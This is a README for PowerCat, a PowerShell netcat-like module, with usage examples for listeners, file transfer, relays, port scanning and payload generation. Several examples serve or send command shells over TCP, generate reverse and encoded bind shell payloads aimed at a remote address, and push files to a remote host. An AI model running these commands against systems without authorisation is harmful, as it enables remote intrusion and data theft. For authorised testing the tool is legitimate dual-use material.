PowerCat
========
```powershell
Write-Warning 'PowerCat is under construction. Check back soon for updates.'
Write-Warning 'I will remove this warning when the code is functional.'
```
A PowerShell TCP/IP swiss army knife. 

Installation
------------
PowerCat is packaged as a PowerShell module.  First you need to import the module before you can use its functions.
###
```powershell
    # Import the functions from downloaded psm1/psd1 File:
    Import-Module PowerCat.psd1
```
### Parameters:
```powershell    
    Start-PowerCat # Listener
    
    -Mode           # Defaults to Tcp, can also specify Udp or Smb        [String]
    -Port           # The port to listen on.                              [Int]
	-PipeName       # Name of pipe to listen on.                          [String]
	
    -Relay          # Format: "<Mode>:<IP>:<Port/Pipe>"                   [String]
    -Execute        # Execute a console process or powershell.            [Switch]
    -SendFile       # Filepath of file to send.                           [String]
    -ReceiveFile    # Filepath of file to be written.                     [String]
    -Disconnect     # Disconnect after connecting.                        [Switch]
    -KeepAlive      # Restart after disconnecting.                        [Switch]
    -Timeout        # Timeout option. Default: 60                         [Int]
	
	Connect-PowerCat # Client
	
    -Mode           # Defaults to Tcp, can also specify Udp or Smb        [String]
	-RemoteIp       # IPv4 address of host to connect to.                 [String]
    -Port           # The port to connect to.                             [Int]
	-PipeName       # Name of pipe to connect to.                         [String]
	
    -Relay          # Format: "<Mode>:<IP>:<Port/Pipe>"                   [String]
    -Execute        # Execute a console process or powershell.            [Switch]
    -SendFile       # Filepath of file to send.                           [String]
    -ReceiveFile    # Filepath of file to be written.                     [String]
    -Disconnect     # Disconnect after connecting.                        [Switch]
    -KeepAlive      # Restart after disconnecting.                        [Switch]
    -Timeout        # Timeout option. Default: 60                         [Int]
```
Basic Connections
-----------------------------------
By default, PowerCat uses TCP and reads/writes from/to the console.
###
```powershell
    # Basic Listener:
    Start-PowerCat -Port 443
        
    # Basic Client:
    Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443
```
File Transfer
-------------
PowerCat can be used to transfer files using the -SendFile and -ReceiveFile parameters.
###
```powershell
    # Send File:
    Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443 -SendFile C:\pathto\inputfile
        
    # Recieve File:
    Start-PowerCat -Port 443 -ReceiveFile C:\pathto\outputfile
```
Shells
------
PowerCat can be used to send and serve shells using the -Execute parameter.
###
```powershell
    # Serve a shell:
    Start-PowerCat -Port 443 -Execute
        
    # Send a cmd Shell:
    Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443 -Execute
```
UDP and SMB
-----------
PowerCat supports more than sending data over TCP. 
###
```powershell
    # Send Data Over UDP:
    Start-PowerCat -Mode Udp -Port 8000
        
    # Send Data Over SMB:
    Start-PowerCat -Mode Smb -PipeName PowerCat
```
Relays
------
Relays in PowerCat are similar to netcat relays, but you don't have to create a file or start a second process. You can also relay data between connections of different protocols.
###
```powershell
    # UDP Listener to TCP Client Relay:
    Start-PowerCat -Mode Udp -Port 8000 -Relay tcp:10.1.1.16:443
        
    # TCP Listener to UDP Client Relay:
    Start-PowerCat -Port 8000 -Relay udp:10.1.1.16:53
        
    # TCP Client to Client Relay
    Connect-PowerCat -RemoteIp 10.1.1.1 -Port 9000 -Relay tcp:10.1.1.16:443
        
    # TCP Listener to SMB Listener Relay
    New-PowerCat -Listener -Port 8000 -Relay smb:PowerCat
```
Generate Payloads
-----------------
Payloads can be generated using New-PowerCatPayload. 
###
```powershell
    # Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
    New-PowerCatPayload -Client -RemoteIp 10.1.1.15 -Port 443 -Execute 
        
    # Generate a bind tcp encoded command which listens on port 8000:
    New-PowerCatPayload -Encoded -Listener -Port 8000 -Execute
```
Misc Usage
----------
PowerCat can also be used to perform port-scans, and start persistent listeners.
###
```powershell
    # Basic TCP port scan:
    1..1024 | ForEach-Object { Connect-PowerCat -RemoteIp 10.1.1.10 -Port $_ -Timeout 1 -Verbose -Disconnect }
    
    # Basic UDP port scan:
    1..1024 | ForEach-Object { Connect-PowerCat -Mode Udp -RemoteIp 10.1.1.10 -Port $_ -Timeout 1 -Verbose }
        
    # Persistent listener:
    Start-PowerCat -Port 443 -SendFile C:\pathto\inputfile -KeepAlive
```
